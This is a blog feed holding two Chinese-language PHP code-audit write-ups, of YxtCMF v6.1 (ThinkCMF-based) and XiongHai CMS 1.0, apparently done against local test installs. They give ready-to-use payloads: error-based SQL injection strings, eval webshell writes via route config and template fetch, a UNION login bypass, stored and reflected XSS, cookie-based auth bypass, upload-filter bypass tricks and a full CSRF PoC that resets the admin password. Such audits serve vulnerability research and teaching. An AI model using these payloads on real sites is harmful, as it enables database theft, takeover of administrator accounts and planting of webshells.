<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Script kiddie&#39;s life</title>
  
  <subtitle>学无止境</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lnng.top/"/>
  <updated>2021-05-05T10:28:42.528Z</updated>
  <id>https://lnng.top/</id>
  
  <author>
    <name>Lmg</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phpMVC 结构审计-YxtCMFv6.1</title>
    <link href="https://lnng.top/posts/74f.html"/>
    <id>https://lnng.top/posts/74f.html</id>
    <published>2021-04-14T12:09:00.000Z</published>
    <updated>2021-05-05T10:28:42.528Z</updated>
    
    <content type="html"><![CDATA[<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>下载地址:<a href="http://down.chinaz.com/soft/38075.htm" target="_blank" rel="noopener">http://down.chinaz.com/soft/38075.htm</a></p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><pre><code>admin    //后台静态文件appliication    //应用文件data    //数据配置文件Expand    //扩展类库目录plugins    //插件public    //一些资源themes    //主题ueditor    //编辑器文件update    //升级文件uploads    //上传文件yxtedu    //核心目录根据Thinkphp3.2.3开发的index.php</code></pre><pre><code>application/xxx/controller    //由于是MVC架构，控制controllerapplication/xxx/Menu    //里面基本上是数组，定义了网站的一些功能名称、模块，我们可以根据这些数组查找到功能点对应的php文件data/conf/route.php    //路由文件data/conf/db.php    //数据库配置文件yxtedu/Core/Mode/Api/function.php    //thinkphp里面的一些自定义的重要函数，后面我们需要用到</code></pre><p><img src="/images/pasted-383.png" alt="upload successful"></p><h3 id="入口文件index-php"><a href="#入口文件index-php" class="headerlink" title="入口文件index.php"></a>入口文件index.php</h3><pre><code>&lt;?phpif (ini_get(&#39;magic_quotes_gpc&#39;)){    function stripslashesRecursive(array $array)    {        foreach ($array as $k =&gt; $v)        {            if (is_string($v))            {                $array[$k] = stripslashes($v);            } else            if (is_array($v))            {                $array[$k] = stripslashesRecursive($v);            }        }        return $array;    }    $_GET = stripslashesRecursive($_GET);    $_POST = stripslashesRecursive($_POST);}define(&quot;APP_DEBUG&quot;,false);define(&#39;SITE_PATH&#39;, dirname(__file__) . &quot;/&quot;);define(&#39;APP_PATH&#39;, SITE_PATH . &#39;application/&#39;);define(&#39;SPAPP_PATH&#39;, SITE_PATH . &#39;yxtedu/&#39;);define(&#39;SPAPP&#39;, &#39;./application/&#39;);define(&#39;SPSTATIC&#39;, SITE_PATH . &#39;statics/&#39;);define(&quot;RUNTIME_PATH&quot;, SITE_PATH . &quot;data/runtime/&quot;);define(&quot;HTML_PATH&quot;, SITE_PATH . &quot;data/runtime/Html/&quot;);define(&quot;THINKCMF_CORE_TAGLIBS&quot;, &#39;cx,Common\Lib\Taglib\TagLibSpadmin,Common\Lib\Taglib\TagLibHome&#39;);if (!file_exists(&quot;data/install.lock&quot;)){    if (strtolower($_GET[&#39;g&#39;]) != &quot;install&quot;)    {        header(&quot;Location:./index.php?g=install&quot;);        exit();    }}require SPAPP_PATH . &#39;Core/ThinkPHP.php&#39;;</code></pre><p>先判断是否开启magic_quotes_gpc，magic_quotes_gpc是配置在php.ini中的，他的作用类似addslashes()，就是对输入的字符创中的字符进行转义处理。他可以对$_POST、$__GET以及进行数据库操作的sql进行转义处理，防止sql注入</p><p>然后进行stripslashesRecursive()调用处理，实质是使用stripslashes(),返回一个去除转义反斜线后的字符串（&#39; 转换为 ‘ 等等）。双反斜线（\）被转换为单个反斜线（\），这里感觉岂不是更不安全</p><p>然后是给常用参数赋值，然后判断是否安装通过data/install.lock是否存在</p><h3 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h3><h4 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h4><p>首页找功能点， 先看登录功能，由于是thinkphp开发的，所以我们只需要看登录的控制器就行了</p><p> login控制器目录</p><pre><code> YxtCMF\application\User\Controller\LoginController.class.php</code></pre><p> 直接查看ajaxlogin()控制登录函数<br><img src="/images/pasted-389.png" alt="upload successful"></p><pre><code>        $username=$_POST[&#39;account&#39;];        $password=$_POST[&#39;password&#39;];        $users_model=M(&#39;Users&#39;);        if(preg_match(&#39;/^\d+$/&#39;, $username)){            $where[&#39;mobile&#39;]=$username;        }else{             if(strpos($username,&quot;@&quot;)&gt;0){                $where[&#39;user_email&#39;]=$username;            }else{                $where[&#39;user_login&#39;]=$username;            }        }             $result = $users_model-&gt;where($where)-&gt;find();</code></pre><p>POST传入值，创建一个M模型，判断了一下用户登录的方式(手机号|邮箱|id)，传入where数组，看下文档<br>文档地址:<a href="http://document.thinkphp.cn/manual_3_2.html#query_type" target="_blank" rel="noopener">http://document.thinkphp.cn/manual_3_2.html#query_type</a><br><img src="/images/pasted-385.png" alt="upload successful"><br>查询历史漏洞，发现thinkphp有个exp<br><img src="/images/pasted-386.png" alt="upload successful"><br>所以我们可以构造一个username的数组进行注入<br>payload：</p><pre><code>account[0]=exp&amp;account[1]=%3d&#39;123&#39;%20and%201%3d(updatexml(1,concat(0x3a,(select%20database())</code></pre><p><img src="/images/pasted-388.png" alt="upload successful"><br>为啥要构造两个等号，因为exp后执行的是完整的wheresql语句无等号<br>可以尝试去掉等号<br><img src="/images/pasted-387.png" alt="upload successful"><br>这里依然可以通过注册一个账号sql读取密码通过sql update来更新管理员的密码，获得管理员权限</p><h4 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h4><p>查看控制器</p><pre><code>application\User\Controller\LoginController.class.php</code></pre><p>查询语句取决于是否设置短信验证<br><img src="/images/pasted-390.png" alt="upload successful"><br>发现经过safe函数进行过滤<br>查看继承的控制器，找safe函数</p><pre><code>application\Common\Controller\HomebaseController.class.php</code></pre><p><img src="/images/pasted-392.png" alt="upload successful"><br>发现过滤了xss利用((xss个人认为没有，实体化了单引号，双引号，和&gt;) 和单引号 不过不影响，主要导致这里无法注入的是 $str = trim($str);<br>trim()处理的对象是字符串，测试传入数组，发现数组变为空(调试结果下图)<br><img src="/images/pasted-393.png" alt="upload successful"><br><img src="/images/pasted-391.png" alt="upload successful"><br>验证一下将$str = trim($str);给注释掉，发现注入成功<br><img src="/images/pasted-394.png" alt="upload successful"><br>所以这里应该没法注入，若分析不对请指正感谢<br>继续看一下忘记密码功能<br><img src="/images/pasted-395.png" alt="upload successful"><br>抓包看了一下调用的是</p><pre><code>application\User\Controller\RegisterController.class.php</code></pre><p>的repassword()方法，同样原理这里存在sql注入<br><img src="/images/pasted-396.png" alt="upload successful"><br>payload</p><pre><code>tel[0]=exp&amp;tel[1]=%3d1%20and%20updatexml(1,concat(0x7e,user()),1)&amp;mobileCode=&amp;password=123456789&amp;repassword=123456789</code></pre><p><img src="/images/pasted-397.png" alt="upload successful"></p><h3 id="普通用户登录"><a href="#普通用户登录" class="headerlink" title="普通用户登录"></a>普通用户登录</h3><p>更改姓名的地方存在存储xss<br><img src="/images/pasted-398.png" alt="upload successful"><br>抓包查看调用的控制器函数为</p><pre><code>application\User\Controller\SettingController.class.php</code></pre><p><img src="/images/pasted-399.png" alt="upload successful"><br>userid是没法该变的系统调用，但是保存的其他未经过任何过滤，存在储存xss,登录管理员后台，发现同样被执行，可盗取管理员cookie<br><img src="/images/pasted-400.png" alt="upload successful"></p><h3 id="管理员后台登录"><a href="#管理员后台登录" class="headerlink" title="管理员后台登录"></a>管理员后台登录</h3><h4 id="广告编辑处存在sql"><a href="#广告编辑处存在sql" class="headerlink" title="广告编辑处存在sql"></a>广告编辑处存在sql</h4><p>控制器</p><pre><code>application\Admin\Controller\AdController.class.php</code></pre><p>37行<br><img src="/images/pasted-401.png" alt="upload successful"><br>经过I函数处理，查看官方文档I函数<br><a href="http://document.thinkphp.cn/manual_3_2.html#input_filter" target="_blank" rel="noopener">http://document.thinkphp.cn/manual_3_2.html#input_filter</a><br><img src="/images/pasted-402.png" alt="upload successful"><br>后没跟过滤选项，查看全局过滤<br><img src="/images/pasted-403.png" alt="upload successful"><br>所以只是实例化了xss<br>存在sql注入<br><img src="/images/pasted-404.png" alt="upload successful"><br>同样的sql还有很多地方,不在看了</p><h4 id="添加路由处getshell"><a href="#添加路由处getshell" class="headerlink" title="添加路由处getshell"></a>添加路由处getshell</h4><pre><code>application\Admin\Controller\RouteController.class.php</code></pre><p><img src="/images/pasted-405.png" alt="upload successful"><br>查看sp_get_routes()函数</p><pre><code>application\Common\Common\function.php</code></pre><pre><code>function sp_get_routes($refresh=false){    $routes=F(&quot;routes&quot;);    if( (!empty($routes)||is_array($routes)) &amp;&amp; !$refresh){        return $routes;    }    $routes=M(&quot;Route&quot;)-&gt;where(&quot;status=1&quot;)-&gt;order(&quot;listorder asc&quot;)-&gt;select();    $all_routes=array();    $cache_routes=array();    foreach ($routes as $er){        $full_url=htmlspecialchars_decode($er[&#39;full_url&#39;]);        // 解析URL        $info   =  parse_url($full_url);        $path       =   explode(&quot;/&quot;,$info[&#39;path&#39;]);        if(count($path)!=3){//必须是完整 url            continue;        }        $module=strtolower($path[0]);        // 解析参数        $vars = array();        if(isset($info[&#39;query&#39;])) { // 解析地址里面参数 合并到vars            parse_str($info[&#39;query&#39;],$params);            $vars = array_merge($params,$vars);        }        $vars_src=$vars;        ksort($vars);        $path=$info[&#39;path&#39;];        $full_url=$path.(empty($vars)?&quot;&quot;:&quot;?&quot;).http_build_query($vars);        $url=$er[&#39;url&#39;];        if(strpos($url,&#39;:&#39;)===false){            $cache_routes[&#39;static&#39;][$full_url]=$url;        }else{            $cache_routes[&#39;dynamic&#39;][$path][]=array(&quot;query&quot;=&gt;$vars,&quot;url&quot;=&gt;$url);        }        $all_routes[$url]=$full_url;    }    F(&quot;routes&quot;,$cache_routes);    $route_dir=SITE_PATH.&quot;/data/conf/&quot;;    if(!file_exists($route_dir)){        mkdir($route_dir);    }    $route_file=$route_dir.&quot;route.php&quot;;    file_put_contents($route_file, &quot;&lt;?php\treturn &quot; . stripslashes(var_export($all_routes, true)) . &quot;;&quot;);    return $cache_routes;}</code></pre><p>最后面<br><img src="/images/pasted-406.png" alt="upload successful"></p><p><img src="/images/pasted-407.png" alt="upload successful"><br>stripslashes<br>var_export<br>相当于没启用作用，so如果可控制$all_routes通过单引号闭合变可写入木马<br><img src="/images/pasted-408.png" alt="upload successful"><br>$url直接从数据库读取没有处理，$full_url 判断了path必须大于三位<br>也就是说最少要a/b/c,<br><img src="/images/pasted-409.png" alt="upload successful"><br>所以可构造闭合单引号写入<br>payload:</p><pre><code>a/b/c&#39;,@eval($_REQUEST[&#39;a&#39;]),&#39;</code></pre><p><img src="/images/pasted-411.png" alt="upload successful"><br>一定要启用,因为where(“status=1”)<br><img src="/images/pasted-417.png" alt="upload successful"><br><img src="/images/pasted-418.png" alt="upload successful"><br>成功写入<br><img src="/images/pasted-419.png" alt="upload successful"></p><h3 id="前台getshel"><a href="#前台getshel" class="headerlink" title="前台getshel"></a>前台getshel</h3><p>任意文件读取payload:</p><pre><code>/index.php?a=display&amp;templateFile=1.txt</code></pre><p><img src="/images/pasted-420.png" alt="upload successful"><br>写入文件getshellp</p><p>pauload:</p><pre><code>index.php?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=&lt;php&gt;file_put_contents(&#39;lnng.php&#39;,&#39;&lt;?php @eval($_POST[&quot;lnng&quot;]); ?&gt;&#39;)&lt;/php&gt;</code></pre><p><img src="/images/pasted-421.png" alt="upload successful"></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>看下面这两个大佬的文章吧，写的超级详细<br><a href="https://www.yuque.com/u390550/hsy6gq/xggm0c#PmqIa" target="_blank" rel="noopener">https://www.yuque.com/u390550/hsy6gq/xggm0c#PmqIa</a><br><a href="https://paper.seebug.org/1419/#41-thinkcmf-2x-fetch" target="_blank" rel="noopener">https://paper.seebug.org/1419/#41-thinkcmf-2x-fetch</a></p><p>简单概括来说Thinkcmf是Tinkphp再开发的，他有一些Thinkphp的特性，可以通过g\m\a参数指定分组\控制器\方法，这里可以通过a参数直接调用(为啥是Portal应用,配置里有个’DEFAULT_MODULE’ =&gt;  ‘Portal’，建议看文章为啥是a和Portal)Portal\IndexController父类HomebaseController中的一些权限为public的方法(fetch方法 display方法)</p><p>然后他有对应的参数</p><p>fetch函数层层分析，最后函数中调用了loadTemplate()函数，进入到该函数中，我们可以看到content最终被赋值到了 $tmplContent参数中；<br>然后$tmplContent (content)经过编译后通过Storage::put函数保存，最终将文件生成到data/runtime/Cache/Portal文件夹中。最后在Template.class.php文件中调用了Storage::load加载cache文件，最终导致代码执行。<br><img src="/images/pasted-422.png" alt="upload successful"></p><p><img src="/images/pasted-423.png" alt="upload successful"></p><p><img src="/images/pasted-425.png" alt="upload successful"></p><p><img src="/images/pasted-424.png" alt="upload successful"><br>还是建议看上面两个大佬的文章这个地方写的非常详细</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://evi1s.com/archives/159/" target="_blank" rel="noopener">https://evi1s.com/archives/159/</a><br><a href="https://www.yuque.com/u390550/hsy6gq/xggm0c#PmqIa" target="_blank" rel="noopener">https://www.yuque.com/u390550/hsy6gq/xggm0c#PmqIa</a><br><a href="https://paper.seebug.org/1419/#41-thinkcmf-2x-fetch" target="_blank" rel="noopener">https://paper.seebug.org/1419/#41-thinkcmf-2x-fetch</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h3&gt;&lt;p&gt;下载地址:&lt;a href=&quot;http://down.chinaz.com/soft/38075.htm&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://lnng.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="MVC" scheme="https://lnng.top/tags/MVC/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计初试-熊海CMS1-0</title>
    <link href="https://lnng.top/posts/e2e8.html"/>
    <id>https://lnng.top/posts/e2e8.html</id>
    <published>2021-03-17T13:08:00.000Z</published>
    <updated>2021-04-01T14:17:32.661Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><p>站长下载:<a href="http://down.chinaz.com/soft/36930.htm" target="_blank" rel="noopener">http://down.chinaz.com/soft/36930.htm</a></p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>VSCode phpstudy2018 php5.6.27</p><p>配置方法:国光大佬<a href="https://www.sqlsec.com/2020/09/xdebug.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/09/xdebug.html</a></p><h3 id="CMS目录"><a href="#CMS目录" class="headerlink" title="CMS目录"></a>CMS目录</h3><pre><code>admin             --后台文件夹css               --css文件夹files             --存放网站的各种功能页面文件夹images            --存放图片文件夹inc               --配置文件夹install           --网站安装文件夹seacmseditor      --网站的编辑器文件夹template          --模板文件夹upload            --存放网站上传的文件index.php         --网站入口</code></pre><h3 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h3><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//单一入口模式</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关闭错误显示</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//接收文件名</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string">''</span><span class="token operator">?</span><span class="token string">'index'</span><span class="token punctuation">:</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//判断为空或者等于index</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'files/'</span><span class="token punctuation">.</span><span class="token variable">$action</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//载入相应文件</span><span class="token delimiter">?></span></code></pre><p>get接收r，包含r名的php文件，没有经过过滤可以跨目录包含任意php文件</p><p>写一个phpinfo文件包含尝试、<br><img src="/images/pasted-342.png" alt="upload successful"></p><p>继续查看files/index.php</p><p><img src="/images/pasted-343.png" alt="upload successful"><br>34行</p><pre class=" language-php"><code class="language-php"><span class="token markup">&lt;a href="?r=content&amp;cid=<span class="token prolog">&lt;?php echo $toutiaoimg['id']?></span></span>"</code></pre><p>跟进一下</p><p><img src="/images/pasted-344.png" alt="upload successful"><br>get接收了cid，经过addslashes函数，转义了单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）<br><img src="/images/pasted-345.png" alt="upload successful"><br>绕过addslashes()方法</p><p>1.没有使用单引号或双引号闭合，直接注入己可</p><p>2.宽字节注入</p><p>%df%27<br>gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，而’逃逸了出来</p><p>3.经过编码后转义在解码插入sql语句</p><p><img src="/images/pasted-346.png" alt="upload successful"><br>查看编码不是gbk，放弃宽字节注入</p><p>发现19行的查询id并没有进行单引号或双引号闭合，可以注入,而且可回显，直接报错注入</p><pre><code>?r=content&amp;cid=1 or(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))</code></pre><p><img src="/images/pasted-348.png" alt="upload successful"><br><img src="/images/pasted-347.png" alt="upload successful"></p><p>继续看154有留言功能</p><p><img src="/images/pasted-349.png" alt="upload successful"></p><p>跟进一下(content.php后面也没传参代码)</p><p>先设置了session，对传入的type进行了addslashes()其他的参数暂时并未转义</p><p>进行了验证码的判断</p><pre><code>if(strtolower($_POST[&#39;randcode&#39;])&lt;&gt;addslashes($_SESSION[&#39;randcode&#39;])){ echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，验证码错误，请重新输入！&#39;);history.back();&lt;/Script&gt;&quot;;exit; }</code></pre><p>然后是对是否为空的判断<br>35~38是对判断评论是否含有GBK中文编码汉字</p><pre><code>if (!preg_match(&quot;/([\x81-\xfe][\x40-\xfe])/&quot;, $content, $match)) {echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;亲，再说点别的了吧？&#39;);history.back();&lt;/Script&gt;&quot;;exit;    }</code></pre><p>48行</p><pre><code>$content= addslashes(strip_tags($content));//过滤HTML</code></pre><p>strip_tags从字符串中去除 HTML 和 PHP 标记<br>又进行了addslashes转义</p><p>个人目前觉得没问题</p><p>66行，发现mail没用经过任何过滤 拼接到查询语句中<br>存在sql注入，闭合标签，报错注入</p><pre><code>$query = &quot;SELECT * FROM interaction WHERE( mail = &#39;$mail&#39;)&quot;;</code></pre><p>payload:</p><pre><code>&#39;) and updatexml(1,concat(0x7e,user()),1)#</code></pre><p>继续向后看，根据配置设置不同的参数，暂时不管</p><p>121行~147行进行将传参放入数据库中,发现很多参数没用经过过滤存在存储xss，sql注入<br>比如name参数<br>存储xss,发现前台输出评论时也没经过任何过滤</p><p><img src="/images/pasted-359.png" alt="upload successful"><br>后台输出时候也没经过过滤，所有可以打后台</p><p><img src="/images/pasted-360.png" alt="upload successful"><br>payload:</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="/images/pasted-351.png" alt="upload successful"><br>sql报错注入,因为有回显</p><pre><code>&#39; and updatexml(1,concat(0x7e,user()),1) and &#39;</code></pre><p>拼接后执行的语句</p><pre><code>&quot;INSERT INTO interaction (type,xs,cid,name,mail,url,touxiang,shebei,ip,content,tz,date) VALUES (&#39;1&#39;,&#39;1&#39;,&#39;5&#39;,&#39;&#39; and updatexml(1,concat(0x7e,user()),1) and &#39;&#39;,&#39;name&#39;,&#39;http://name&#39;,&#39;81&#39;,&#39;PC&#39;,&#39;127.0.0.1&#39;,&#39;name sql 测试&#39;,&#39;1&#39;,now())&quot;</code></pre><p>通过引号的闭合执行语句</p><p>继续<br>if ($pltz==1)执行下面的代码,发现中间sql的查询<br><img src="/images/pasted-352.png" alt="upload successful"><br>而且cid的变量未经过过滤</p><p>查看如何让pltz==1</p><p><img src="/images/pasted-353.png" alt="upload successful"><br>需要站长开启，新留言评论通知，我们开启尝试一下<br><img src="/images/pasted-354.png" alt="upload successful"><br>报错注入,同样有回显<br>payload(type要等于comment或download,这样type才能等于1or3<br>才能执行sql语句):</p><pre><code>5)%20and%20updatexml(1,concat(0x7e,user()),1)#</code></pre><p><img src="/images/pasted-355.png" alt="upload successful"></p><h3 id="继续看file下的文件"><a href="#继续看file下的文件" class="headerlink" title="继续看file下的文件"></a>继续看file下的文件</h3><h4 id="about-php-contact-php-同理"><a href="#about-php-contact-php-同理" class="headerlink" title="about.php contact.php 同理"></a>about.php contact.php 同理</h4><p><img src="/images/pasted-357.png" alt="upload successful"><br>contact.php还存在反射形xss<br><img src="/images/pasted-365.png" alt="upload successful"><br>payload:</p><pre><code>/?r=contact&amp;page=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="/images/pasted-366.png" alt="upload successful"></p><h4 id="software-php"><a href="#software-php" class="headerlink" title="software.php"></a>software.php</h4><p><img src="/images/pasted-358.png" alt="upload successful"><br>同理第二个地方存在注入</p><p>payload:</p><pre><code>1 and updatexml(1,concat(0x7e,user()),1)#</code></pre><h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>入口文件同初始入口目录相同，也同样存在文件包含</p><pre><code>&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&#39;r&#39;]); //接收文件名$action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于indexinclude(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件?&gt;</code></pre><p>继续进入/admin/files/index.php目录</p><pre><code>&lt;?phprequire &#39;../inc/checklogin.php&#39;;require &#39;../inc/conn.php&#39;;$indexopen=&#39;class=&quot;open&quot;&#39;;?&gt;</code></pre><p>查看checklogin.php对登录的验证</p><pre><code>&lt;?php$user=$_COOKIE[&#39;user&#39;];if ($user==&quot;&quot;){header(&quot;Location: ?r=login&quot;);exit;    }?&gt;</code></pre><p>也就是说如果cookie中的user不为空就可以直接跳过登录，存在未授权访问<br><img src="/images/pasted-361.png" alt="upload successful"><br>这里index里还包含了后台的菜单等会再看<br>先查看登录页面login.php<br><img src="/images/pasted-367.png" alt="upload successful"><br>username并未经过过滤，存在sql注入<br><img src="/images/pasted-368.png" alt="upload successful"><br>同时这里还存在任意密码登录</p><p>参考大佬的文章(涨知识了):<a href="https://xz.aliyun.com/t/7629" target="_blank" rel="noopener">https://xz.aliyun.com/t/7629</a></p><p>什么原理呢？？它这里通过查询返回的passwd字段与传入passwd的md5比较<br>而这个passwd字段我们是可控的，那么就任意密码登录了<br><img src="/images/pasted-369.png" alt="upload successful"></p><p><img src="/images/pasted-370.png" alt="upload successful"></p><p>所以payload:</p><pre><code>username：1&#39; union select 1,2,3,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;,5,6,7,8#password：1</code></pre><p>这样比注入拿到md5的passwd反过来解登录舒服<br>登录跳转回index，查看刚刚index没看的后台菜单<br>95行调用了/template/top.php<br><img src="/images/pasted-362.png" alt="upload successful"><br>跟进看一下</p><p><img src="/images/pasted-363.png" alt="upload successful"><br>54行对cookie的user并未经过任何过滤直接执行sql，存在cookie注入<br>而且有回显报错注入<br><img src="/images/pasted-364.png" alt="upload successful"><br>继续查看/template/sidebar.php<br>有发布内容 内容管理 栏目管理 友情链接<br>互动 设置等功能<br>查看发布内容<br>\admin\files\newwz.php<br><img src="/images/pasted-373.png" alt="upload successful"><br>查看对于上传文件的处理<br><img src="/images/pasted-374.png" alt="upload successful"><br>获取文件名称后三个字母</p><pre><code> function GetFileTypeToString() {  if( ! empty( $this -&gt; uploadFile[ &#39;name&#39; ] ) )  {   return substr( strtolower( $this -&gt; uploadFile[ &#39;name&#39; ] ) , strlen( $this -&gt; uploadFile[ &#39;name&#39; ] ) - 3 , 3 );    } }}</code></pre><p>后三个字母进行白名单处理</p><pre><code>function GetFileMIME() {  return $this-&gt;GetFileTypeToString(); }function CheckFileMIMEType() {  $pass = false;  $defineTypeList = strtolower( $this -&gt;defineTypeList);  $MIME = strtolower( $this -&gt; GetFileMIME());  if (!empty ($defineTypeList))  {   if (!empty ($MIME))   {    foreach(explode(&quot;|&quot;,$defineTypeList) as $tmp)    {     if ($tmp == $MIME)     {      $pass = true;     }    }</code></pre><p>到目前为止其实还是可以绕过的，可以利用shell.php/jpg<br>test.php%00.jpg test.php:1.jpg(windows)</p><p>取决于你的保存方式</p><p>查看保存</p><p><img src="/images/pasted-375.png" alt="upload successful"><br>随机数+时间加文件名后三位，就是检测的后三位，抬走上传不了(个人理解)即使传图片马利用文件包含但是我们没似乎也不知道文件名</p><p>继续看发布文章,83行没有经过过滤直接插入数据库存在sql注入<br><img src="/images/pasted-376.png" alt="upload successful"><br>payload:</p><pre><code>1&#39; and updatexml(1,concat(0x7e,user()),1) and &#39;</code></pre><p>发布下载newsoft和上面一样不看了</p><p>继续看wzlist.php</p><p><img src="/images/pasted-377.png" alt="upload successful"><br>同样原理sql注入不在多说，编辑文章和上面一样<br>softlist.php和newsoft一样不看了<br>继续看栏目管理<br>newcolumn.php没有过滤sql注入(同样原理)<br><img src="/images/pasted-378.png" alt="upload successful"><br>columnlist.php sql注入<br><img src="/images/pasted-379.png" alt="upload successful"><br>后面的各种设置漏洞都差不多<br>查看修改密码部分</p><p><img src="/images/pasted-380.png" alt="upload successful"><br>修改密码并没有要之前的密码，而验证是否是管理员<br>还是cookie的方式<br>所以存在csrf<br>burp抓包<br><img src="/images/pasted-381.png" alt="upload successful"></p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;script&gt;      function submitRequest()      {        var xhr = new XMLHttpRequest();        xhr.open(&quot;POST&quot;, &quot;http:\/\/127.0.0.1\/xhcms\/admin\/?r=manageinfo&quot;, true);        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8&quot;);        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;);        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart\/form-data; boundary=---------------------------36130568313950689285470620618&quot;);        xhr.withCredentials = true;        var body = &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;user\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;admin\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;name\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;admin\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;password\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;12345\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;password2\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;12345\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;mail\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;me@isea.so\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;qq\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;86226999\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;images\&quot;; filename=\&quot;\&quot;\r\n&quot; +           &quot;Content-Type: application/octet-stream\r\n&quot; +           &quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618\r\n&quot; +           &quot;Content-Disposition: form-data; name=\&quot;save\&quot;\r\n&quot; +           &quot;\r\n&quot; +           &quot;1\r\n&quot; +           &quot;-----------------------------36130568313950689285470620618--\r\n&quot;;        var aBody = new Uint8Array(body.length);        for (var i = 0; i &lt; aBody.length; i++)          aBody[i] = body.charCodeAt(i);         xhr.send(new Blob([aBody]));      }    &lt;/script&gt;    &lt;form action=&quot;#&quot;&gt;      &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;script&gt;      function submitRequest()      {        var xhr = new XMLHttpRequest();        xhr.open(&quot;POST&quot;, &quot;http:\/\/127.0.0.1\/xhcms\/admin\/?r=manageinfo&quot;, true);        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8&quot;);        